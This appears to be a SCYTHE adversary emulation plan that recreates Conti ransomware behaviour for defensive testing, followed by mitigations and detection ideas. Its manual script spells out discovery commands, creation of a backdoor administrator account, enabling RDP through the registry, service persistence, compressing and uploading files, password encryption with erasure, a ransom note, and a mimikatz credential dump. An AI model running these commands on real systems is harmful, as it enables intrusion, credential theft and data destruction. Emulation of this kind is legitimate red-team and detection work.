# Conti Ransomware Adversary Emulation Plan

## Executive Summary
For this #ThreatThursday we are looking at one of the most common ransomware threats, Conti. 

## Cyber Threat Intelligence
This threat is based on The DFIR Report post on May 12, 2021: https://thedfirreport.com/2021/05/12/conti-ransomware/

### Profile
Conti is currently the “King of Ransomware on the DarkWeb” according to DarkTracer. They operate Ransomware-as-a-Service and are believed to be Russian.

### Targets
Conti ransomware has impacted healthcare and first responder networks as per the FBI Flash and multiple news outlets covering Ireland, New Zealand, and Canada health services. As Conti that has hit hundreds of organizations, we have enough CTI to create an adversary emulation plan.

### Objectives
- Double Extortion
- Ransomware
- Exfiltration of Data

## Attack
This section covers how to emulate the attack at the procedure level. 

### Automated Emulation
To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/Conti/Conti_scythe_threat.json
2. Download the Virtual File System (VFS) files under Conti/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/Conti
4. Create a new campaign, selecting HTTPS, and ensuring the communication options match the CTI: --cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 62 --jitter 39
5. Set the Program database path to: A:\source\conti_v3\x64\Release\cryptor_dll.pdb 
6. Import from Existing Threat: Conti
7. Launch Campaign
8. Execute with rundll32.exe

Note that different TTPs will be performed based on the endpoint being on a domain or not and running with local administrator privileges or not.

### Manual Emulation
```
Start (with https, loader, and controller)
STEP = DISCOVERY
loader --load run
run ipconfig /all
run systeminfo
run whoami /groups
run net config workstation
run net use
run echo %userdomain%
If step 8 contains "The system cannot find the file specified." goto step 15
run nltest /domain_trusts
run nltest /domain_trusts /all_trusts
run net view /all /domain
run net view /all
run net group "Domain Admins" /domain
STEP = PERSIST
controller --integrity
If step 16 does not contain "High" goto step 22
run net user /add /Y nuuser 7HeC00l3stP@ssw0rd
run net localgroup administrators nuuser /add
run cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
run cmd /c sc.exe create Conti binpath= c:\windows\system32\Conti.exe type= share start= auto
STEP = IMPACT
loader --load crypt
loader --load downloader
loader --load file
loader --load uploader
run powershell mkdir "%USERPROFILE%\Desktop\Conti"
file --create --path "%USERPROFILE%\Desktop\Conti\target_file.doc" --size 1MB --count 100 --random
run powershell "Compress-Archive -Path $env:userprofile\Desktop\Conti -CompressionLevel Optimal -Destination $env:userprofile\Desktop\exfil.zip"
uploader --remotepath "%USERPROFILE%\Desktop\exfil.zip"
crypt --target "%USERPROFILE%\Desktop\Conti\" --encrypt --password "dTonVhthjUJCMM6JkCi8" --erase
downloader --src "VFS:/shared/Conti/readme.txt" --dest "%USERPROFILE%\Desktop\readme.txt"
run powershell notepad "%USERPROFILE%\Desktop\readme.txt"
STEP = CLEANUP
run cmd /c rmdir /Q /S %USERPROFILE%\Desktop\Conti"
run cmd /c del "%USERPROFILE%\Desktop\exfil.zip"
run cmd /c del "%USERPROFILE%\Desktop\README.txt"
controller --integrity
If step 38 does not contain "High" goto step 46
run cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x1 /f
run net localgroup administrators nuuser /del
run net user /del nuuser
run sc delete Conti
loader --load mimikatz
mimikatz --arglist sekurlsa::logonPasswords
controller --shutdown
Finish
```

## Detection Opportunities
The FBI Flash covers a number of mitigations that we are providing in this post but also want to add a few items related to detection and response. Prevention will make initial access and execution a little harder but for those, logically, working under assumed breach, we need detection and response:

- Regularly back up data, air gap, and password protect backup copies offline. Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides.
- Implement network segmentation.
- Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (i.e., hard drive, storage device, the cloud).
- Install updates/patch operating systems, software, and firmware as soon as they are released.
- Use multifactor authentication where possible.
- Use strong passwords and regularly change passwords to network systems and accounts, implementing the shortest acceptable timeframe for password changes. Avoid reusing passwords for multiple accounts.
- Disable unused remote access/RDP ports and monitor remote access/RDP logs.
- Require administrator credentials to install software.
- Audit user accounts with administrative privileges and configure access controls with least privilege in mind.
- Install and regularly update anti-virus and anti-malware software on all hosts.
- Only use secure networks and avoid using public Wi-Fi networks. Consider installing and using a VPN.
- Consider adding an email banner to messages coming from outside your organizations.
- Disable hyperlinks in received emails.
- Focus on cyber security awareness and training. Regularly provide users with training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities (i.e., ransomware and phishing scams).
- Detect when new services are created on endpoints
- Detect when certain registry keys are modified such as enabling Remote Desktop Protocol
- Detect when new users are created and/or added to the local administrator group


## References
- https://thedfirreport.com/2021/05/12/conti-ransomware/
- https://www.aha.org/system/files/media/file/2021/05/fbi-tlp-white-report-conti-ransomware-attacks-impact-healthcare-and-first-responder-networks-5-20-21.pdf?mod=djemCybersecruityPro&tpl=cy
